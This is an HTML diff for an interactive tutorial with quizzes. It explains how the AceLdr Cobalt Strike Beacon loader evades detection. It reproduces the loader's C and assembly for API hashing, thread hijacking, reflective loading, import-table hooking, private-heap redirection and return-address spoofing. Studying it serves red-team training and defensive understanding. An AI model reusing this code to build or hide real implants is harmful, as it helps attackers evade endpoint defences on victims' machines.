+<p>Q1: Why use DJB2 hashing instead of storing API name strings?</p>
+<label data-opt="0"><input type="radio" name="q2_0"> DJB2 is faster than string comparison</label>
+<label data-opt="1"><input type="radio" name="q2_0"> Strings would make the binary too large</label>
+<label data-opt="2"><input type="radio" name="q2_0"> To avoid suspicious plaintext API names that static analysis tools flag</label>
+<label data-opt="3"><input type="radio" name="q2_0"> Windows requires hashed imports for position-independent code</label>
+<div class="explain">Static analysis tools like YARA rules and strings analysis look for suspicious API names. By using hashes, the binary contains only opaque 32-bit integers that can't be easily identified. The tradeoff is a runtime cost of hashing every export name for comparison.</div>
+</div>
+<div class="quiz-q" data-correct="0">
+<p>Q2: The PEB is accessed through which structure?</p>
+<label data-opt="0"><input type="radio" name="q2_1"> The TEB (Thread Environment Block)</label>
+<label data-opt="1"><input type="radio" name="q2_1"> The IAT (Import Address Table)</label>
+<label data-opt="2"><input type="radio" name="q2_1"> The GDT (Global Descriptor Table)</label>
+<label data-opt="3"><input type="radio" name="q2_1"> The KPCR (Kernel Processor Control Region)</label>
+<div class="explain">On x64 Windows, the TEB is at gs:[0x30], and PEB is at offset 0x60 within the TEB. NtCurrentTeb()->ProcessEnvironmentBlock gives you the PEB pointer in C code.</div>
+</div>
+<div class="quiz-q" data-correct="1">
+<p>Q3: The DJB2 hash starts with a "magic number." What is it?</p>
+<label data-opt="0"><input type="radio" name="q2_2"> 0xDEADBEEF</label>
+<label data-opt="1"><input type="radio" name="q2_2"> 5381</label>
+<label data-opt="2"><input type="radio" name="q2_2"> 31337</label>
+<label data-opt="3"><input type="radio" name="q2_2"> 0</label>
+<div class="explain">DJB2 uses 5381 as its initial hash value. This was chosen by Daniel J. Bernstein and provides good distribution with minimal collisions for typical string inputs. The actual code initializes to 5380 then increments (Djb++ making it 5381).</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz2')">Check Answers</button>
+<div class="quiz-result" id="quiz2-result"></div>
+</div>
+
+<div class="nav-btns">
+<button onclick="goTo(1)">&larr; Previous</button>
+<button class="primary" onclick="goTo(3)">Next: Reflective Loading &rarr;</button>
+</div>
+</div>
+
+<!-- ============== MODULE 3 ============== -->
+<div class="module" id="mod3">
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 4: Reflective DLL Loading</h1>
+<p class="subtitle">Loading a DLL without Windows ever knowing about it.</p>
+
+<div class="card highlight">
+<h4>What Makes It "Reflective"?</h4>
+<p>Normally, you call <code>LoadLibrary("beacon.dll")</code> and Windows handles everything: maps the file, resolves imports, applies relocations. But that leaves traces everywhere - the module appears in the PEB module list, file-backed memory, event logs. <strong>Reflective loading</strong> means the DLL loads <em>itself</em> from raw bytes in memory, bypassing the Windows loader entirely. No file on disk, no entry in the module list.</p>
+</div>
+
+<h2>AceLdr's Loading Sequence</h2>
+<p>The complete chain from shellcode injection to Beacon running:</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Full Reflective Loading Pipeline</h4>
+<div class="flow" style="flex-direction:column;gap:4px;max-width:600px;margin:0 auto">
+<div class="box hl" style="width:100%">1. Start() - ASM entry, aligns stack, calls Ace()</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box hl" style="width:100%">2. Ace() - Creates suspended thread, hijacks its RIP to Loader()</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box y" style="width:100%">3. Loader() - resolveLoaderFunctions() from NTDLL via PEB</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box y" style="width:100%">4. calculateRegions() - parse PE headers, compute memory layout</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box y" style="width:100%">5. NtAllocateVirtualMemory() - allocate RW space for stub + beacon</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box" style="width:100%">6. copyStub() - copy AceLdr's hook code to allocated region</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box" style="width:100%">7. copyBeaconSections() - map PE sections to virtual addresses</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box" style="width:100%">8. RtlCreateHeap() - create private heap for Beacon</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box" style="width:100%">9. installHooks() - resolve IAT + overwrite 6 function pointers</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box" style="width:100%">10. NtProtectVirtualMemory() - change protection to RX</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box g" style="width:100%">11. executeBeacon() - call Beacon's DllMain (reason=1, then reason=4)</div>
+</div>
+</div>
+
+<h2>Thread Hijacking via Ace()</h2>
+<p>AceLdr doesn't just call <code>Loader()</code> directly. It creates a <strong>suspended thread</strong> and overwrites its instruction pointer. This is a common technique to avoid having the loader's call stack visible during Beacon execution:</p>
+
+<pre><code><span class="lang-tag">C - from ace.c</span>VOID Ace( VOID )
+{
+    API     Api;
+    CONTEXT Ctx;
+    HANDLE  Thread;
+
+    // ... resolve NtGetContextThread, NtSetContextThread, etc.
+
+    // Create a suspended thread at an innocent-looking start address
+    // (RtlUserThreadStart + 0x21 is a ret instruction)
+    PVOID StartAddress = pApi->ntdll.RtlUserThreadStart + 0x21;
+    pApi->ntdll.RtlCreateUserThread(
+        (HANDLE)-1,    // current process
+        NULL, TRUE,    // suspended = TRUE
+        0, 0, 0,
+        StartAddress,  // innocent start address
+        NULL, &amp;Thread, NULL );
+
+    // Hijack: overwrite RIP to point at our Loader function
+    Ctx.ContextFlags = CONTEXT_CONTROL;
+    Api.ntdll.NtGetContextThread( Thread, &amp;Ctx );
+    Ctx.Rip = (DWORD64) Loader;   // &lt;-- The hijack
+    Api.ntdll.NtSetContextThread( Thread, &amp;Ctx );
+
+    // Resume the thread - it now executes Loader() instead
+    Api.ntdll.NtResumeThread( Thread, NULL );
+
+    // Clean up evidence
+    RtlSecureZeroMemory( &amp;Api, sizeof(Api) );
+    RtlSecureZeroMemory( &amp;Ctx, sizeof(Ctx) );
+}</code></pre>
+
+<h2>Memory Layout After Loading</h2>
+<p>AceLdr's <code>STUB</code> structure sits at the very beginning of the allocated region and acts as the control block for all hook functions:</p>
+
+<pre><code><span class="lang-tag">C - from include.h</span>typedef struct __attribute__(( packed ))
+{
+    ULONG_PTR Region;  // Base address of entire allocation
+    ULONG_PTR Size;    // Total size of allocation
+    HANDLE    Heap;    // Handle to private heap
+} STUB, *PSTUB;</code></pre>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Memory Layout After Reflective Load</h4>
+<div style="display:flex;gap:2px;flex-direction:column;max-width:500px;margin:0 auto;font-size:.8rem">
+<div style="background:var(--accent);color:var(--bg);padding:8px;text-align:center;border-radius:6px 6px 0 0;font-weight:700">STUB (Region, Size, Heap) - 24 bytes</div>
+<div style="background:#7c3aed;color:#fff;padding:8px;text-align:center;font-weight:700">AceLdr Hook Code (Sleep_Hook, Spoof, etc.)</div>
+<div style="background:var(--border);padding:4px;text-align:center;color:var(--dim)">Page alignment padding</div>
+<div style="background:var(--green);color:var(--bg);padding:8px;text-align:center;font-weight:700">Beacon .text (code)</div>
+<div style="background:#065f46;color:#fff;padding:8px;text-align:center">Beacon .rdata (imports, strings)</div>
+<div style="background:#064e3b;color:#fff;padding:8px;text-align:center">Beacon .data (globals)</div>
+<div style="background:#022c22;color:#fff;padding:8px;text-align:center;border-radius:0 0 6px 6px">Beacon .reloc (relocations)</div>
+</div>
+</div>
+
+<div class="card green">
+<h4>Key Insight: Why the Stub Sits First</h4>
+<p>The hook functions need to know where the allocation starts (to encrypt it during sleep) and where the heap is (to redirect <code>GetProcessHeap</code>). By placing the STUB at the start and using position-independent addressing (<code>OFFSET(Stub)</code>), any hook function can find this data without global variables.</p>
+</div>
+
+<div class="quiz" id="quiz3">
+<h4>Pop Quiz: Reflective Loading</h4>
+<div class="quiz-q" data-correct="2">
+<p>Q1: Why does Ace() create a suspended thread instead of calling Loader() directly?</p>
+<label data-opt="0"><input type="radio" name="q3_0"> For multithreading performance</label>
+<label data-opt="1"><input type="radio" name="q3_0"> Because Loader() requires a separate thread to work</label>
+<label data-opt="2"><input type="radio" name="q3_0"> To avoid having the shellcode's call stack visible during Beacon execution</label>
+<label data-opt="3"><input type="radio" name="q3_0"> Windows requires DllMain to run on a new thread</label>
+<div class="explain">If Loader() ran on the original shellcode injection thread, the call stack would trace back to the injected shellcode. By creating a new thread and hijacking its RIP, the Beacon runs on a clean thread with no suspicious stack frames.</div>
+</div>
+<div class="quiz-q" data-correct="0">
+<p>Q2: executeBeacon() calls DllMain with two different "reason" values. What are they?</p>
+<label data-opt="0"><input type="radio" name="q3_1"> 1 (DLL_PROCESS_ATTACH) then 4 (DLL_BEACON_INIT - Cobalt Strike specific)</label>
+<label data-opt="1"><input type="radio" name="q3_1"> 0 (DLL_PROCESS_DETACH) then 1 (DLL_PROCESS_ATTACH)</label>
+<label data-opt="2"><input type="radio" name="q3_1"> 1 (DLL_PROCESS_ATTACH) then 2 (DLL_THREAD_ATTACH)</label>
+<label data-opt="3"><input type="radio" name="q3_1"> Just 1 (DLL_PROCESS_ATTACH) twice</label>
+<div class="explain">Reason 1 is standard DLL_PROCESS_ATTACH. Reason 4 is a special Cobalt Strike value that signals Beacon to begin its main C2 loop. This two-step initialization is a Cobalt Strike convention for UDRL loaders.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz3')">Check Answers</button>
+<div class="quiz-result" id="quiz3-result"></div>
+</div>
+
+<div class="nav-btns">
+<button onclick="goTo(2)">&larr; Previous</button>
+<button class="primary" onclick="goTo(4)">Next: Position-Independent Code &rarr;</button>
+</div>
+</div>
+
+<!-- ============== MODULE 4 ============== -->
+<div class="module" id="mod4">
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 5: Position-Independent Code (PIC)</h1>
+<p class="subtitle">Code that doesn't know where it lives - and doesn't need to.</p>
+
+<div class="card highlight">
+<h4>Why PIC Matters</h4>
+<p>Shellcode gets injected at an unknown, random address. It can't use global variables or absolute addresses because it doesn't know where it is. Every data reference must be <strong>relative to the current instruction pointer</strong>. AceLdr is entirely position-independent - from its ASM entry point to its C hook functions.</p>
+</div>
+
+<h2>The GetIp Trick</h2>
+<p>The foundation of PIC: "Where am I right now?" On x64, you can use RIP-relative addressing, but AceLdr uses a classic technique for maximum compatibility:</p>
+
+<pre><code><span class="lang-tag">ASM - from misc.asm</span>GetIp:
+    call   get_ret_ptr    ; CALL pushes the address of the next instruction
+
+get_ret_ptr:
+    pop    rax            ; RAX = address of get_ret_ptr (= our current location)
+    sub    rax, 5         ; Adjust back to GetIp's address (CALL is 5 bytes)
+    ret                   ; Return with RAX = address of GetIp()</code></pre>
+
+<div class="card">
+<h4>How It Works Step by Step</h4>
+<ol>
+<li><code>call get_ret_ptr</code> pushes the return address (address of <code>pop rax</code>) onto the stack</li>
+<li><code>pop rax</code> retrieves that address into RAX</li>
+<li><code>sub rax, 5</code> adjusts back by the size of the CALL instruction</li>
+<li>Now RAX contains the address of <code>GetIp</code> itself</li>
+</ol>
+<p>Since we know where <code>GetIp</code> is <strong>relative to the rest of our code</strong> (determined at compile time), we can calculate the address of anything:</p>
+</div>
+
+<h2>The OFFSET Macro</h2>
+<pre><code><span class="lang-tag">C - from include.h</span>// "Where is X right now, in this process's memory?"
+#define OFFSET( x ) ( ULONG_PTR )( GetIp() - ( (ULONG_PTR)&amp;GetIp - (ULONG_PTR)x ) )
+
+// At compile time: &amp;GetIp - x = distance between GetIp and x
+// At runtime:      GetIp() returns actual address of GetIp
+// So:              GetIp() - distance = actual address of x</code></pre>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">OFFSET Macro Visualization</h4>
+<div style="max-width:500px;margin:0 auto;font-size:.85rem;font-family:monospace">
+<div style="display:flex;gap:0;align-items:stretch">
+<div style="width:80px;text-align:right;padding:5px;color:var(--dim)">0x????</div>
+<div style="flex:1;border-left:3px solid var(--accent);padding:5px 15px">
+<div style="padding:6px 0;border-bottom:1px dashed var(--border)"><span style="color:var(--yellow)">Stub:</span> (data we want to find)</div>
+<div style="padding:6px 0;border-bottom:1px dashed var(--border);color:var(--dim)">... other code ...</div>
+<div style="padding:6px 0;border-bottom:1px dashed var(--border)"><span style="color:var(--green)">GetIp:</span> (we know this address at runtime)</div>
+<div style="padding:6px 0;color:var(--dim)">... more code ...</div>
+</div>
+</div>
+<div style="margin-top:10px;color:var(--accent)">distance = &amp;GetIp - &amp;Stub (known at compile time)<br>OFFSET(Stub) = GetIp() - distance = actual address of Stub</div>
+</div>
+</div>
+
+<h2>The Custom Linker Script</h2>
+<p>AceLdr controls the exact layout of code in memory using a linker script. Each function is assigned to a <strong>named subsection</strong> using the <code>SECTION()</code> macro:</p>
+
+<pre><code><span class="lang-tag">LD - from link.ld</span>SECTIONS
+{
+    .text :
+    {
+        *( .text$A )    /* start.asm - Entry point (Start) */
+        *( .text$B )    /* ace.c     - Loader/Ace functions */
+        *( .text$C )    /* misc.asm  - Stub data + GetIp */
+        *( .text$D )    /* hooks     - Sleep_Hook, Spoof hooks, Heap hook */
+        *( .text$E )    /* util.c    - HashString, FindModule, etc. */
+        *( .rdata* )    /* Read-only data (strings, etc.) */
+        *( .text$F )    /* misc.asm  - GetIp impl + "ACELDR" marker */
+    }
+}</code></pre>
+
+<pre><code><span class="lang-tag">C - Section assignment macro</span>#define SECTION( x ) __attribute__(( section( ".text$" #x ) ))
+
+// Usage:
+SECTION( B ) VOID Loader( VOID ) { ... }  // Goes into .text$B
+SECTION( D ) VOID Sleep_Hook( ... ) { ... } // Goes into .text$D
+SECTION( E ) PVOID FindModule( ... ) { ... } // Goes into .text$E</code></pre>
+
+<h2>The ACELDR End Marker</h2>
+<p>After compilation, the extraction script needs to know where the shellcode ends. The string <code>"ACELDR"</code> at the very end of .text$F serves as a delimiter:</p>
+
+<pre><code><span class="lang-tag">ASM - from misc.asm</span>[SECTION .text$F]
+GetIp:
+    call    get_ret_ptr
+get_ret_ptr:
+    pop    rax
+    sub    rax, 5
+    ret
+
+Leave:
+    db 'A', 'C', 'E', 'L', 'D', 'R'   ; End marker</code></pre>
+
+<pre><code><span class="lang-tag">Python - from extract.py</span># Find the marker and extract everything before it
+PeSec = PeExe.sections[0].get_data()
+ScRaw = PeSec[ : PeSec.find( b'ACELDR' ) ]  # Shellcode = bytes before marker</code></pre>
+
+<div class="quiz" id="quiz4">
+<h4>Pop Quiz: Position-Independent Code</h4>
+<div class="quiz-q" data-correct="1">
+<p>Q1: The GetIp function uses <code>call + pop</code>. What does CALL push onto the stack?</p>
+<label data-opt="0"><input type="radio" name="q4_0"> The address of the CALL instruction itself</label>
+<label data-opt="1"><input type="radio" name="q4_0"> The address of the instruction AFTER the CALL (the return address)</label>
+<label data-opt="2"><input type="radio" name="q4_0"> The value of the stack pointer</label>
+<label data-opt="3"><input type="radio" name="q4_0"> The base pointer (RBP)</label>
+<div class="explain">CALL pushes the address of the next instruction (the return address) and then jumps to the target. POP then retrieves this address into a register. This is the classic way to get the current instruction pointer in shellcode.</div>
+</div>
+<div class="quiz-q" data-correct="2">
+<p>Q2: Why does AceLdr use a custom linker script?</p>
+<label data-opt="0"><input type="radio" name="q4_1"> To make the binary smaller</label>
+<label data-opt="1"><input type="radio" name="q4_1"> To add debug symbols</label>
+<label data-opt="2"><input type="radio" name="q4_1"> To control the exact order of code sections so OFFSET() calculations work correctly</label>
+<label data-opt="3"><input type="radio" name="q4_1"> Because MinGW requires one</label>
+<div class="explain">The OFFSET() macro relies on knowing the compile-time distance between functions. The linker script ensures functions are placed in a predictable order (.text$A through .text$F). Without it, the linker could reorder functions and break all the position-independent addressing.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz4')">Check Answers</button>
+<div class="quiz-result" id="quiz4-result"></div>
+</div>
+
+<div class="nav-btns">
+<button onclick="goTo(3)">&larr; Previous</button>
+<button class="primary" onclick="goTo(5)">Next: IAT Hooking &rarr;</button>
+</div>
+</div>
+
+<!-- ============== MODULE 5 ============== -->
+<div class="module" id="mod5">
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 6: IAT Hooking &amp; Heap Redirection</h1>
+<p class="subtitle">Intercepting function calls by rewriting the phone book.</p>
+
+<div class="card highlight">
+<h4>What's the Play?</h4>
+<p>After loading Beacon's PE into memory and filling its Import Address Table, AceLdr <strong>overwrites 6 specific IAT entries</strong> with pointers to its own hook functions. When Beacon calls <code>Sleep()</code>, it actually calls <code>Sleep_Hook()</code>. When it calls <code>GetProcessHeap()</code>, it gets a fake heap. Beacon has no idea.</p>
+</div>
+
+<h2>The 6 Hooks</h2>
+<table>
+<tr><th>Original Function</th><th>AceLdr Hook</th><th>Purpose</th></tr>
+<tr><td><code>Sleep</code></td><td><code>Sleep_Hook</code></td><td>FOLIAGE encryption + APC sleep chain</td></tr>
+<tr><td><code>GetProcessHeap</code></td><td><code>GetProcessHeap_Hook</code></td><td>Return private heap instead of process heap</td></tr>
+<tr><td><code>HeapAlloc</code></td><td><code>HeapAlloc_Hook</code></td><td>Spoof return address on allocations</td></tr>
+<tr><td><code>RtlAllocateHeap</code></td><td><code>RtlAllocateHeap_Hook</code></td><td>Spoof return address on allocations</td></tr>
+<tr><td><code>InternetConnectA</code></td><td><code>InternetConnectA_Hook</code></td><td>Spoof return address on network calls</td></tr>
+<tr><td><code>NtWaitForSingleObject</code></td><td><code>NtWaitForSingleObject_Hook</code></td><td>Spoof return address on wait calls</td></tr>
+</table>
+
+<h2>How LdrHookImport Works</h2>
+<pre><code><span class="lang-tag">C - from util.c</span>VOID LdrHookImport( PVOID image, PVOID directory, ULONG hash, PVOID function )
+{
+    // Walk every imported module
+    for( Imp = directory; Imp->Name != 0; ++Imp )
+    {
+        // Walk every imported function in this module
+        Otd = image + Imp->OriginalFirstThunk;  // Names
+        Ntd = image + Imp->FirstThunk;           // Addresses (the IAT)
+
+        for( ; Otd->u1.AddressOfData != 0; ++Otd, ++Ntd )
+        {
+            if( !IMAGE_SNAP_BY_ORDINAL( Otd->u1.Ordinal ) )
+            {
+                Ibn = image + Otd->u1.AddressOfData;
+                Djb = HashString( Ibn->Name, 0 );
+
+                if( Djb == hash )  // Found the target function!
+                {
+                    // OVERWRITE the IAT entry with our hook
+                    Ntd->u1.Function = (ULONGLONG) function;
+                }
+            }
+        }
+    }
+}</code></pre>
+
+<h2>The Heap Redirection: Simplest But Most Effective</h2>
+<pre><code><span class="lang-tag">C - from hooks/heap.c (yes, the entire file)</span>SECTION( D ) HANDLE GetProcessHeap_Hook()
+{
+    return ( ( PSTUB )OFFSET( Stub ) )->Heap;
+}
+// That's it. One line. Returns the private heap from the STUB structure.</code></pre>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Heap Redirection in Action</h4>
+<div style="display:flex;gap:30px;justify-content:center;flex-wrap:wrap">
+<div style="flex:1;min-width:280px">
+<div class="flow" style="flex-direction:column;gap:4px">
+<div class="box" style="width:100%">Beacon calls: GetProcessHeap()</div>
+<div style="text-align:center;color:var(--dim)">&darr; IAT redirects to</div>
+<div class="box hl" style="width:100%">GetProcessHeap_Hook()</div>
+<div style="text-align:center;color:var(--dim)">&darr; reads STUB.Heap</div>
+<div class="box g" style="width:100%">Returns: private heap handle</div>
+</div>
+</div>
+<div style="flex:1;min-width:280px">
+<div class="flow" style="flex-direction:column;gap:4px">
+<div class="box" style="width:100%">Beacon allocates memory on "process heap"</div>
+<div style="text-align:center;color:var(--dim)">&darr; actually goes to</div>
+<div class="box g" style="width:100%">Private heap (invisible to default heap scanners)</div>
+<div style="text-align:center;color:var(--dim)">&darr; encrypted during sleep by</div>
+<div class="box hl" style="width:100%">encryptHeap() via RtlWalkHeap</div>
+</div>
+</div>
+</div>
+</div>
+
+<h2>Installing All Hooks</h2>
+<pre><code><span class="lang-tag">C - from ace.c installHooks()</span>VOID installHooks( PVOID map, PVOID buffer, PIMAGE_NT_HEADERS nt )
+{
+    // First: fill in ALL imports normally
+    LdrProcessIat( map, map + Dir->VirtualAddress );
+
+    // Then: surgically replace 6 specific entries with hooks
+    // PTR_TO_HOOK calculates the hook's actual address in the allocation
+    LdrHookImport( map, dir, H_API_GETPROCESSHEAP,
+                   PTR_TO_HOOK( buffer, GetProcessHeap_Hook ) );
+    LdrHookImport( map, dir, H_API_SLEEP,
+                   PTR_TO_HOOK( buffer, Sleep_Hook ) );
+    LdrHookImport( map, dir, H_API_RTLALLOCATEHEAP,
+                   PTR_TO_HOOK( buffer, RtlAllocateHeap_Hook ) );
+    LdrHookImport( map, dir, H_API_HEAPALLOC,
+                   PTR_TO_HOOK( buffer, HeapAlloc_Hook ) );
+    LdrHookImport( map, dir, H_API_INTERNETCONNECTA,
+                   PTR_TO_HOOK( buffer, InternetConnectA_Hook ) );
+    LdrHookImport( map, dir, H_API_NTWAITFORSINGLEOBJECT,
+                   PTR_TO_HOOK( buffer, NtWaitForSingleObject_Hook ) );
+}</code></pre>
+
+<pre><code><span class="lang-tag">C - from ace.c (the PTR_TO_HOOK macro)</span>// Translates a compile-time function reference into its runtime address
+// within the allocated buffer
+#define PTR_TO_HOOK( a, b ) C_PTR( U_PTR(a) + OFFSET(b) - OFFSET(Stub) )
+
+// a = base of allocation (buffer)
+// OFFSET(b) = runtime address of hook function
+// OFFSET(Stub) = runtime address of Stub (start of allocation)
+// So: buffer + (hook_addr - stub_addr) = hook's position within buffer</code></pre>
+
+<div class="quiz" id="quiz5">
+<h4>Pop Quiz: IAT Hooking</h4>
+<div class="quiz-q" data-correct="3">
+<p>Q1: How many IAT entries does AceLdr overwrite?</p>
+<label data-opt="0"><input type="radio" name="q5_0"> All of them</label>
+<label data-opt="1"><input type="radio" name="q5_0"> 3</label>
+<label data-opt="2"><input type="radio" name="q5_0"> 10</label>
+<label data-opt="3"><input type="radio" name="q5_0"> 6 (Sleep, GetProcessHeap, HeapAlloc, RtlAllocateHeap, InternetConnectA, NtWaitForSingleObject)</label>
+<div class="explain">AceLdr only hooks the functions it needs to intercept. Sleep for the FOLIAGE chain, GetProcessHeap/HeapAlloc/RtlAllocateHeap for heap redirection, and InternetConnectA/NtWaitForSingleObject for return address spoofing.</div>
+</div>
+<div class="quiz-q" data-correct="1">
+<p>Q2: What's the entire implementation of GetProcessHeap_Hook?</p>
+<label data-opt="0"><input type="radio" name="q5_1"> It creates a new heap and returns it</label>
+<label data-opt="1"><input type="radio" name="q5_1"> It reads the Heap field from the STUB structure and returns it</label>
+<label data-opt="2"><input type="radio" name="q5_1"> It calls the original GetProcessHeap and encrypts the result</label>
+<label data-opt="3"><input type="radio" name="q5_1"> It allocates virtual memory and returns a pointer</label>
+<div class="explain">The hook is literally one line: return ((PSTUB)OFFSET(Stub))->Heap. It uses the OFFSET macro to find the STUB structure and returns the pre-created private heap handle. Simple and effective.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz5')">Check Answers</button>
+<div class="quiz-result" id="quiz5-result"></div>
+</div>
+
+<div class="nav-btns">
+<button onclick="goTo(4)">&larr; Previous</button>
+<button class="primary" onclick="goTo(6)">Next: Return Address Spoofing &rarr;</button>
+</div>
+</div>
+
+<!-- ============== MODULE 6 ============== -->
+<div class="module" id="mod6">
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 7: Return Address Spoofing</h1>
+<p class="subtitle">Making your API calls look like they came from somewhere else.</p>
+
+<div class="card highlight">
+<h4>The Threat Model</h4>
+<p>When a thread calls an API like <code>NtWaitForSingleObject</code>, defenders can inspect the <strong>call stack</strong>. A normal stack shows a chain like: <code>kernel32 &rarr; user_code &rarr; ntdll</code>. But if the return address points to an unbacked, private memory region (where AceLdr lives), that's a dead giveaway. Return address spoofing makes the call appear to originate from a legitimate DLL.</p>
+</div>
+
+<h2>The Gadget: JMP [RBX]</h2>
+<p>AceLdr searches loaded DLLs for the byte sequence <code>FF 23</code>, which is the <code>JMP QWORD PTR [RBX]</code> instruction. This "gadget" is used as a trampoline:</p>
+
+<pre><code><span class="lang-tag">C - from util.c</span>PVOID FindGadget( LPBYTE module, ULONG size )
+{
+    for( int x = 0; x &lt; size; x++ )
+    {
+        // Search for FF 23 = JMP [RBX]
+        if( compare( module + x, "\xFF\x23", 2 ) == 0 )
+            return (LPVOID)( module + x );
+    }
+    return NULL;
+}</code></pre>
+
+<h2>The Spoofing Mechanism</h2>
+<p>The PRM (Parameter) structure ties together the gadget, target function, and saved state:</p>
+
+<pre><code><span class="lang-tag">C - from include.h</span>typedef struct {
+    const void* trampoline;  // Address of JMP [RBX] gadget (in a legit DLL)
+    void*       function;    // Real function we want to call
+    void*       rbx;         // Saved RBX (will be restored after)
+} PRM, *PPRM;</code></pre>
+
+<pre><code><span class="lang-tag">C - from retaddr.c</span>PVOID SpoofRetAddr( PVOID function, HANDLE module, ULONG size,
+                    PVOID a, ... PVOID h )
+{
+    PVOID Trampoline = FindGadget( module, size ); // Find JMP [RBX] in the DLL
+
+    if( Trampoline != NULL )
+    {
+        PRM param = { Trampoline, function }; // Pack gadget + target
+        // Call Spoof() ASM which sets up the fake return address
+        return Spoof( a, b, c, d, &amp;param, NULL, e, f, g, h );
+    }
+    return NULL;
+}</code></pre>
+
+<h2>The Assembly: Where the Magic Happens</h2>
+<pre><code><span class="lang-tag">ASM - from spoof.asm</span>Spoof:
+    pop    r11                ; Save real return address in R11
+    add    rsp, 8             ; Skip shadow space gap
+    mov    rax, [rsp + 24]    ; RAX = pointer to PRM struct
+    mov    r10, [rax]         ; R10 = PRM.trampoline (JMP [RBX] gadget addr)
+    mov    [rsp], r10         ; OVERWRITE return address with gadget address!
+    mov    r10, [rax + 8]     ; R10 = PRM.function (real target)
+    mov    [rax + 8], r11     ; Save our real return addr in PRM.function slot
+    mov    [rax + 16], rbx    ; Save original RBX
+    lea    rbx, [fixup]       ; RBX = address of our fixup routine
+    mov    [rax], rbx         ; PRM.trampoline = fixup address
+    mov    rbx, rax           ; RBX = PRM struct pointer
+    jmp    r10                ; Jump to the REAL function
+
+; When the real function returns, it returns to the gadget (JMP [RBX])
+; The gadget jumps to [RBX] = PRM struct, which now points to fixup:
+
+fixup:
+    sub    rsp, 16            ; Adjust stack
+    mov    rcx, rbx           ; RCX = PRM struct
+    mov    rbx, [rcx + 16]    ; Restore original RBX
+    jmp    QWORD [rcx + 8]    ; Jump to our REAL return address</code></pre>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Return Address Spoofing - Step by Step</h4>
+<div class="flow" style="flex-direction:column;gap:4px;max-width:600px;margin:0 auto">
+<div class="box" style="width:100%">1. Hook function calls SPOOF(target_func, ...args)</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box y" style="width:100%">2. Spoof() overwrites stack return address with JMP [RBX] gadget address (inside legit DLL)</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box" style="width:100%">3. JMP to real function (e.g., NtWaitForSingleObject)</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box g" style="width:100%">4. Function runs. Stack walker sees return to legitimate DLL code!</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box y" style="width:100%">5. Function returns &rarr; hits gadget (JMP [RBX]) &rarr; jumps to fixup</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box" style="width:100%">6. fixup restores RBX and returns to the real caller</div>
+</div>
+</div>
+
+<h3>Example: InternetConnectA with Spoofing</h3>
+<pre><code><span class="lang-tag">C - from hooks/spoof.c</span>HINTERNET InternetConnectA_Hook( HINTERNET hInternet, LPCSTR lpszServerName, ... )
+{
+    // Resolve the REAL InternetConnectA from wininet.dll
+    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
+    hNet = FindModule( H_LIB_WININET, Peb, &amp;Size );
+    Api.net.InternetConnectA = FindFunction( hNet, H_API_INTERNETCONNECTA );
+
+    // Call it through the SPOOF macro - return addr will point to wininet.dll
+    return (HINTERNET)SPOOF( Api.net.InternetConnectA, hNet, Size,
+        hInternet, lpszServerName, nServerPort, lpszUserName,
+        lpszPassword, dwService, dwFlags, dwContext );
+}</code></pre>
+
+<div class="quiz" id="quiz6">
+<h4>Pop Quiz: Return Address Spoofing</h4>
+<div class="quiz-q" data-correct="2">
+<p>Q1: What byte sequence does FindGadget search for?</p>
+<label data-opt="0"><input type="radio" name="q6_0"> 90 90 (NOP NOP)</label>
+<label data-opt="1"><input type="radio" name="q6_0"> C3 (RET)</label>
+<label data-opt="2"><input type="radio" name="q6_0"> FF 23 (JMP QWORD PTR [RBX])</label>
+<label data-opt="3"><input type="radio" name="q6_0"> CC (INT3)</label>
+<div class="explain">FF 23 encodes JMP [RBX], which is an indirect jump through the RBX register. AceLdr uses this as a trampoline: it controls RBX to redirect execution after the real API call returns through the gadget.</div>
+</div>
+<div class="quiz-q" data-correct="0">
+<p>Q2: Why does the gadget need to be inside a legitimate DLL?</p>
+<label data-opt="0"><input type="radio" name="q6_1"> So the return address on the stack points to legitimate, file-backed code</label>
+<label data-opt="1"><input type="radio" name="q6_1"> Because the gadget instruction doesn't exist in private memory</label>
+<label data-opt="2"><input type="radio" name="q6_1"> For DEP compatibility</label>
+<label data-opt="3"><input type="radio" name="q6_1"> Legitimate DLLs execute faster</label>
+<div class="explain">When a security tool walks the call stack of a sleeping thread, it sees the return address pointing into a known, signed DLL (like ntdll.dll). This looks completely normal, unlike a return address pointing to unbacked private memory, which would be flagged immediately.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz6')">Check Answers</button>
